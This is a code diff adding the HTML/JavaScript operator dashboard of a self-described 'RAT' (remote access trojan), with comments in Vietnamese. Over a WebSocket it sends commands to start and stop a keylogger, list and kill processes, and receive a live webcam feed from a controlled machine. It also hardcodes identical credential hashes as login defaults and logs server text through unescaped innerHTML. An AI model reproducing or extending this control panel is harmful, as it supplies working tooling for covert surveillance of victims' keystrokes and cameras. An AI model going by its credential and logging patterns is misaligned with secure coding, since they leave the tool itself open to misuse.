@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Remote Control Dashboard</title>
+    <style>
+        body { font-family: monospace; background: #222; color: #0f0; padding: 20px; }
+        .panel { border: 1px solid #444; padding: 10px; margin-bottom: 10px; }
+        button { cursor: pointer; padding: 5px 10px; background: #333; color: #fff; border: 1px solid #fff; }
+        button:hover { background: #555; }
+        input { background: #333; color: #fff; border: 1px solid #555; padding: 5px; }
+        #logs { height: 200px; overflow-y: scroll; border: 1px solid #555; padding: 5px; background: #000; }
+        #cam-feed { width: 320px; height: 240px; background: #111; border: 1px solid red; display: block; }
+    </style>
+</head>
+<body>
+
+    <h2>🕷️ RAT Control Panel</h2>
+
+    <div class="panel" id="login-panel">
+        <input type="text" id="username" placeholder="User Hash" value="8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918">
+        <input type="password" id="password" placeholder="Pass Hash" value="8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918">
+        <button onclick="doLogin()">Login</button>
+    </div>
+
+    <div class="panel" id="control-panel">
+        <button onclick="sendCommand('list_processes')">List Processes</button>
+        <button onclick="sendCommand('start_keylog')">Start Keylog</button>
+        <button onclick="sendCommand('stop_keylog')">Stop Keylog</button>
+        <hr>
+        <input type="number" id="pid-input" placeholder="PID to kill">
+        <button onclick="killProc()">Kill Process</button>
+    </div>
+
+    <div class="panel">
+        <h3>Webcam Stream</h3>
+        <img id="cam-feed" src="" alt="Waiting for stream...">
+    </div>
+
+    <div id="logs"></div>
+
+    <script>
+        // 1. KẾT NỐI SERVER
+        const ws = new WebSocket("ws://localhost:8080");
+        
+        // Thiết lập nhận dữ liệu Binary (quan trọng cho Webcam)
+        ws.binaryType = "arraybuffer"; 
+
+        const logDiv = document.getElementById('logs');
+        const camImg = document.getElementById('cam-feed');
+
+        function log(msg) {
+            logDiv.innerHTML += `<div>> ${msg}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // --- SỰ KIỆN WEBSOCKET ---
+
+        ws.onopen = () => {
+            log("Connected to Server! Please login.");
+        };
+
+        ws.onclose = () => {
+            log("Disconnected from Server.");
+        };
+
+        ws.onmessage = (event) => {
+            // 2. XỬ LÝ DỮ LIỆU NHẬN VỀ
+            const data = event.data;
+
+            // A. Nếu là Binary (Webcam)
+            if (data instanceof ArrayBuffer) {
+                // Tạo Blob từ dữ liệu nhị phân nhận được
+                const blob = new Blob([data], {type: "image/jpeg"});
+                // Tạo URL tạm thời để gán vào thẻ <img>
+                const url = URL.createObjectURL(blob);
+                
+                // Giải phóng bộ nhớ URL cũ để tránh leak RAM
+                if (camImg.src) URL.revokeObjectURL(camImg.src);
+                
+                camImg.src = url;
+                return;
+            }
+
+            // B. Nếu là Text/JSON (Lệnh điều khiển)
+            try {
+                const msg = JSON.parse(data);
+                
+                if (msg.type === "auth_result") {
+                    log("Login Success: " + msg.data);
+                    document.getElementById('login-panel').style.border = "1px solid green";
+                } else if (msg.type === "process_list") {
+                    console.log("Process List:", msg.data); // Xem chi tiết trong F12 Console
+                    log("Received process list (check console)");
+                } else if (msg.type === "error") {
+                    log("ERROR: " + JSON.stringify(msg.data));
+                } else {
+                    log("Response: " + JSON.stringify(msg));
+                }
+            } catch (e) {
+                log("Parse Error: " + data);
+            }
+        };
+
+        // --- CÁC HÀM GỬI LỆNH ---
+
+        function doLogin() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            // Khớp với Protocol::TYPE::AUTH bên C++
+            const packet = {
+                type: "auth", 
+                data: { user: user, pass: pass }
+            };
+            ws.send(JSON.stringify(packet));
+        }
+
+        function sendCommand(cmdType, dataObj = {}) {
+            const packet = {
+                type: cmdType,
+                data: dataObj
+            };
+            ws.send(JSON.stringify(packet));
+        }
+
+        function killProc() {
+            const pid = parseInt(document.getElementById('pid-input').value);
+            if (pid) {
+                sendCommand('kill_process', { pid: pid });
+            }
+        }
+
+    </script>
+</body>
+</html>
